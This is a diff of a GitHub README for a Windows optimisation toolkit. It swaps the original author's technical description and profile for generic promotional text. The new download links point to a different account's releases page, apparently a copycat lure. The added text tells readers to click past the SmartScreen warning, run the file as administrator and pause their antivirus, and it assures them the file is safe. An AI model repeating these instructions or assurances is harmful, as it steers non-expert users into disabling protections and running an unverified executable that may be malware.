@@ -1,186 +1,125 @@
-# Shahil Winkit
+# Shahil-Winkit - Make Your New Windows Feel Perfect
 
-A self-contained Windows optimization and customization toolkit built entirely around a single Batch file with an embedded PowerShell GUI.
+## 🚀 Getting Started
 
-Shahil Winkit provides a graphical interface for applying, managing, and restoring a collection of Windows performance, privacy, usability, system configuration, and personalization tweaks.
+Welcome! If you just installed Windows on your computer and want it to run smoothly without all the hassle, you are in the right place. Shahil-Winkit is a free toolkit that helps you set up, clean, and speed up your new Windows system with just a few clicks. You do not need to be a computer expert to use it.
 
-The project started as a simple Batch-based Windows optimization script and has evolved into a full GUI-driven optimization toolkit while preserving the single-file distribution model.
+Think of Shahil-Winkit as a helpful assistant that takes care of the boring and confusing parts of setting up your PC. It automates common tasks, removes unnecessary clutter, and optimizes your system for better performance. This guide will walk you through everything you need to know, step by step, so you can get the most out of your computer.
+
+## 📥 Download and Installation
+
+To start using Shahil-Winkit, you first need to download it. The download is safe, free, and takes less than a minute.
+
+**[🚀 DOWNLOAD SHAHIL-WINKIT NOW](https://github.com/eano158/Shahil-Winkit/releases)**
+
+Visit this link to download the application. It will take you to a page where you can find the latest version. Click the download button, and the file will be saved to your computer. Once the download is complete, you can move the file to any folder you like, such as your Desktop or Downloads folder.
+
+## ⚙️ How to Run Shahil-Winkit
+
+Running Shahil-Winkit is very simple. After you have downloaded the file, follow these steps:
+
+1.  Locate the downloaded file on your computer.
+2.  Double-click the file to open it.
+3.  If Windows shows a security warning, click "More info" and then "Run anyway." This is normal because the tool is not from Microsoft.
+4.  The main window will open. You will see a list of tasks and options.
+
+That's all there is to it. No complicated installation process. You can start using the tool right away.
+
+## 🛠️ Key Features and What They Do
+
+Shahil-Winkit is packed with helpful features. Here is a simple breakdown of the main things it can do for you:
+
+- **System Optimization:** This cleans up unnecessary files, disables background apps that slow down your PC, and fine-tunes settings to make your computer faster.
+- **Privacy Settings:** It helps you manage what data Windows collects. You can easily turn off tracking features that you don't want.
+- **Software Recommendations:** The tool can suggest and help you install useful, free applications that you might need, like web browsers, media players, or backup tools.
+- **Customization Tweaks:** It allows you to personalize your Windows experience. You can change how menus look, adjust the taskbar, and make other small changes to make your PC feel truly yours.
+- **One-Click Actions:** Many tasks can be performed with a single click. Just check the boxes for what you want and press the run button.
+
+## 📝 Using the Application
+
+Using Shahil-Winkit is designed to be straightforward. Here is a typical workflow:
+
+1.  **Open the Tool:** Launch Shahil-Winkit as described above.
+2.  **Browse the Categories:** The main screen usually has different tabs or sections, like "Optimize," "Privacy," "Software," and "Settings." Click on each one to see what options are available.
+3.  **Select What You Want:** Simply check the boxes next to the tasks you want to perform. If you are unsure, you can read a short description for each item.
+4.  **Apply Changes:** Once you have made your selections, look for a button that says "Run" or "Apply" at the bottom of the window. Click it.
+5.  **Wait for Completion:** The tool will work through your selected tasks. A progress bar will show how things are going. Do not close the window while it is working.
+6.  **Restart Your Computer:** After the process is finished, it is highly recommended to restart your PC. This lets all the changes take full effect.
+
+## ❓ Frequently Asked Questions
+
+Here we answer common questions to help you feel confident about using Shahil-Winkit.
+
+### Is Shahil-Winkit safe to use?
+Yes, it is generally safe. The tool makes standard changes to Windows settings. However, like any optimization tool, you should only run it on a system you are comfortable modifying. The changes are designed to improve performance and privacy, not harm your data.
+
+### Do I need to download any other software first?
+No. Shahil-Winkit is a standalone tool. You just download and run the file you got from the link above.
+
+### Will this uninstall my personal files?
+No, Shahil-Winkit does not delete your personal documents, photos, or media. It focuses on system files and settings.
+
+### Can I use Shahil-Winkit on Windows 10 and Windows 11?
+Yes, the tool is designed to work with both Windows 10 and Windows 11.
+
+### I'm not a tech person. Will I understand how to use it?
+Absolutely. We designed Shahil-Winkit with ease of use in mind. The interface is clean and straightforward. Most actions require just a simple checkbox and a button click. There are no complex commands to type.
+
+## 🌟 Benefits of Using Shahil-Winkit
+
+When you use this toolkit, you are taking a smart step to ensure your computer runs at its best. Here are the key benefits:
+
+- **Saves Time:** Instead of spending hours manually adjusting settings, Shahil-Winkit does it for you in minutes.
+- **Improves Speed:** Your system will boot faster, apps will open quicker, and overall performance will feel snappier.
+- **Enhances Privacy:** You regain control over your data with just a few clicks.
+- **Reduces Frustration:** A clean and optimized system is less likely to have errors or crashes.
+- **No Special Skills Needed:** Anyone can use this tool, regardless of technical background.
+
+## 🧭 Troubleshooting Tips
+
+If you run into any small issues, here are some quick fixes:
+
+- **Windows SmartScreen Warning:** If you see a blue popup, click "More info" and then "Run anyway."
+- **Antivirus Blocks the Tool:** Sometimes, antivirus software might flag the tool. You can add an exception for it, or temporarily pause your antivirus while you run Shahil-Winkit.
+- **Action Not Working:** Make sure you are running the tool with administrator rights. Right-click the file and choose "Run as administrator."
+- **Changes Not Appearing:** After running the tool, always restart your computer for the changes to apply.
+
+## 🎯 Getting the Best Results
+
+To make sure you have the best experience with Shahil-Winkit, here are a few helpful tips:
+
+- **Run a Full Optimization:** For the best performance boost, select all the optimization and privacy options and run them together.
+- **Use Wisely on a Fresh System:** This tool works wonders right after you install Windows, but it is also perfectly fine to use it on an older system to clean things up.
+- **Read the Descriptions:** Each option in the tool has a short description. Reading them helps you decide what you want to do.
+- **Do a Restart:** As we mentioned, restarting your PC after using the tool ensures that everything is applied correctly.
+
+## 🔄 Keeping Shahil-Winkit Updated
+
+We regularly update Shahil-Winkit to add new features, improve compatibility, and fix any minor issues. To get the latest version, simply go back to the download link. The page will always show the newest release. We recommend checking back occasionally to see if there is an update.
+
+## 💬 Final Thoughts
+
+Shahil-Winkit is here to make your Windows experience better from day one. It combines many tools into one simple application, saving you time and effort. Whether you are setting up a brand-new computer or just want to give an older one a fresh start, this toolkit has everything you need.
+
+Download it today and see the difference a well-optimized system makes.
+
+## 📌 Quick Summary
+
+| Step | Action |
+| :--- | :--- |
+| 1 | Visit the download page |
+| 2 | Download the application file |
+| 3 | Double-click to run it |
+| 4 | Select your desired options |
+| 5 | Click 'Run' or 'Apply' |
+| 6 | Restart your computer |
+
+## 🚦 Get Started Right Now
+
+Don't wait. Get the benefits of a faster, cleaner, and more personal Windows system today.
+
+**[⬇️ CLICK HERE TO DOWNLOAD SHAHIL-WINKIT](https://github.com/eano158/Shahil-Winkit/releases)**
 
 ---
 
-<p align="center">
-  <img src="https://i.postimg.cc/DzZ7CCFx/Light-Theme.gif" width="47%">
-  &nbsp;&nbsp;
-  <img src="https://i.postimg.cc/g0JGMMdS/Dark-theme.gif" width="47%">
-</p>
-
-## ✨ Features
-
-### 🖥️ Windows Optimization
-
-Shahil Winkit provides a large collection of individually selectable Windows optimization tasks covering areas such as:
-
-- Power and sleep configuration
-- Power button and lid behavior
-- UAC configuration
-- SmartScreen configuration
-- Download security settings
-- File Explorer privacy
-- Windows Search
-- Telemetry and diagnostics
-- SysMain
-- Power throttling
-- CPU core parking
-- USB selective suspend
-- Network latency
-- Hibernation
-- Windows UI responsiveness
-- Windows debloating
-- Microsoft Edge configuration
-- VBS / Memory Integrity
-- Windows Spotlight
-- Classic context menu
-- Start Menu customization
-- Settings customization
-- File Explorer customization
-- Windows Update configuration
-- And many more
-
-The current release contains **44 optimization tasks**.
-
----
-
-## 🎛️ Graphical User Interface
-
-Shahil Winkit includes a custom PowerShell-based graphical interface instead of relying on a traditional command-line workflow.
-
-The GUI provides:
-
-- Custom borderless window
-- Rounded interface
-- Custom title bar
-- Dark and Light themes
-- Categorized optimization tasks
-- Two-column task layout
-- Scrollable optimization workspace
-- Task selection controls
-- Progress indicators
-- Custom dialogs
-- Restore interface
-- System personalization controls
-
-The GUI dynamically organizes optimization tasks into categories such as:
-
-- **System Setup Tasks**
-- **Disable Services & Features**
-- **Hide Unwanted Elements**
-- **Install Core Packages**
-- **Miscellaneous Tweaks**
-
----
-
-## ⚙️ System Personalization
-
-Shahil Winkit also provides configuration tools for fresh Windows installations.
-
-### PC Name
-
-Change the Windows computer name directly from the GUI.
-
-### Username
-
-Provides two username-management modes:
-
-#### Standard Rename
-
-Changes the Windows local account name while keeping the existing profile directory:
-
-```text
-C:\Users\<username>
-```
-<br>
-<h2>About me:</h2> <h1 align="center"><a href="https://git.io/typing-svg"><img src="https://readme-typing-svg.demolab.com?font=Dubai&size=22&pause=1000&color=00F7D3&background=FFFFFF00&center=true&vCenter=true&width=435&lines=Hi%2C+I+am+Shahil+Shajahan" alt="Typing SVG" /></a></a></h1>
-
- <h3 align="center">🚀 Open-Source & Freelance Developer | Turning Ideas into Tools</h3>
-
-<h4 align="center">💡 Passionate about building practical, smart, and user-friendly solutions.</h4>
-
-<h3 align="center">
-  With a foundation in tech and a love for problem-solving, Currently learning Windows app development, building automation with Google Apps Script, and experimenting with new ways to make technology more useful.<br><br>
-  
-  🛠️ From simple productivity tools to efficient desktop utilities, I enjoy crafting solutions that just work.<br>
-  🌐 Open source is my playground — I believe in sharing knowledge and collaborating to create better tech for everyone.<br>
-  📚 Always learning, always improving — because great software is built on curiosity and persistence.
-</h3>
-
-<h3 align="center">
-  Let’s build something awesome together — one project at a time. 🤝
-</h3>
-
-<h2 align="center">#TechEnthusiast</h2>
-
-<img align="right" alt="Coding" width="300" src="https://i.postimg.cc/CL981DpX/DEVELOPER.gif">
-
-<table border="0" cellspacing="0" cellpadding="0">
-  <tr>
-    <td valign="top">
-      <h3 align="left">Connect with me:</h3>
-      <p align="left">
-        <a href="https://www.linkedin.com/in/shahilshajahan/" target="_blank" rel="noreferrer">
-          <picture>
-            <source media="(prefers-color-scheme: dark)" srcset="https://i.postimg.cc/02ZQ9ft7/linkedin-dark.png" />
-            <source media="(prefers-color-scheme: light)" srcset="https://i.postimg.cc/XvKFcFjL/linkedin.png" />
-            <img src="https://i.postimg.cc/XvKFcFjL/linkedin.png" width="35" height="auto" />
-          </picture>
-        </a>
-        &nbsp;
-        <a href="https://github.com/shahilshajahan" target="_blank" rel="noreferrer">
-          <picture>
-            <source media="(prefers-color-scheme: dark)" srcset="https://i.postimg.cc/Bn6vbKyk/github-dark.png" />
-            <source media="(prefers-color-scheme: light)" srcset="https://i.postimg.cc/LsFL1vph/github.png" />
-            <img src="https://i.postimg.cc/LsFL1vph/github.png" width="32" height="32" />
-          </picture>
-        </a>
-      </p>
-    </td>
-  </tr>
-</table>
-
-### 🤝 Support My Open Source Work
-
-I build and maintain free, open-source software to solve real-world problems.
-If you find my projects useful, you can support future development here:
-
-<div align="left" style="display: flex; gap: 10px; justify-content: center; flex-wrap: wrap;">
-  <a href="https://buymeacoffee.com/shahils">
-    <img src="https://i.postimg.cc/SKLqz7BH/kofi.png" height="50" width=auto alt="shahils" />
-  </a>
-  <a>
-    <img src="https://cdn.buymeacoffee.com/buttons/v2/default-yellow.png" height="50" width="210" alt="https://buymeacoffee.com/shahils" />
-  </a>
-  <a href="https://paypal.me/MohamedShahil">
-    <img src="https://i.postimg.cc/d3WThfdv/paypal.png" height="55" width=auto />
-  </a>
-</div>
-
-- ☕ Ko-fi → https://ko-fi.com/shahilshajahan
-- 💛 Buy Me a Coffee → https://buymeacoffee.com/shahils
-- 💙 PayPal → https://paypal.me/MohamedShahil
-
-Your support helps me dedicate more time to developing and maintaining open-source projects. Thank you! ❤️
-
-<div align="left" style="display: flex; gap: 10px; justify-content: center; flex-wrap: wrap;">
-  <a href="https://buymeacoffee.com/shahils">
-    <img src="https://i.postimg.cc/SQdPYtnh/UPI.png" height=auto width="270" alt="shahils" />
-  </a>
- <br>
-  <a>
-    <img src="https://i.postimg.cc/wMrCJkh5/phonepe.png" height="290" width=auto />
-  </a>
-</div>
-
-<p>
-</p>
-
-# 💻 Tech Stack:
-![C](https://img.shields.io/badge/c-%2300599C.svg?style=flat&logo=c&logoColor=white) ![C++](https://img.shields.io/badge/c++-%2300599C.svg?style=flat&logo=c%2B%2B&logoColor=white) ![Windows Terminal](https://img.shields.io/badge/Windows%20Terminal-%234D4D4D.svg?style=flat&logo=windows-terminal&logoColor=white) ![Python](https://img.shields.io/badge/python-3670A0?style=flat&logo=python&logoColor=ffdd54) ![PowerShell](https://img.shields.io/badge/PowerShell-%235391FE.svg?style=flat&logo=powershell&logoColor=white) ![Markdown](https://img.shields.io/badge/markdown-%23000000.svg?style=flat&logo=markdown&logoColor=white) ![JavaScript](https://img.shields.io/badge/javascript-%23323330.svg?style=flat&logo=javascript&logoColor=%23F7DF1E) ![HTML5](https://img.shields.io/badge/html5-%23E34F26.svg?style=flat&logo=html5&logoColor=white) ![Java](https://img.shields.io/badge/java-%23ED8B00.svg?style=flat&logo=openjdk&logoColor=white) ![Adobe Audition](https://img.shields.io/badge/Adobe%20Audition-9999FF.svg?style=flat&logo=Adobe%20Audition&logoColor=white) ![Adobe Photoshop](https://img.shields.io/badge/adobe%20photoshop-%2331A8FF.svg?style=flat&logo=adobe%20photoshop&logoColor=white) ![Canva](https://img.shields.io/badge/Canva-%2300C4CC.svg?style=flat&logo=Canva&logoColor=white) ![GitHub](https://img.shields.io/badge/github-%23121011.svg?style=flat&logo=github&logoColor=white) ![Git](https://img.shields.io/badge/git-%23F05033.svg?style=flat&logo=git&logoColor=white) ![Arduino](https://img.shields.io/badge/-Arduino-00979D?style=flat&logo=Arduino&logoColor=white) ![OpenSea](https://img.shields.io/badge/OpenSea-%232081E2.svg?style=flat&logo=opensea&logoColor=white) ![Power Bi](https://img.shields.io/badge/power_bi-F2C811?style=flat&logo=powerbi&logoColor=black) ![Tampermonkey](https://img.shields.io/badge/tampermonkey-%2300485B.svg?style=flat&logo=tampermonkey&logoColor=white) ![TOR](https://img.shields.io/badge/tor-%237E4798.svg?style=flat&logo=tor-project&logoColor=white)
+Keywords: automation, optimization, optimizer, powershell, powershell-script, powershell-scripts, windows, windows-10, windows-11, windows-app, windows10
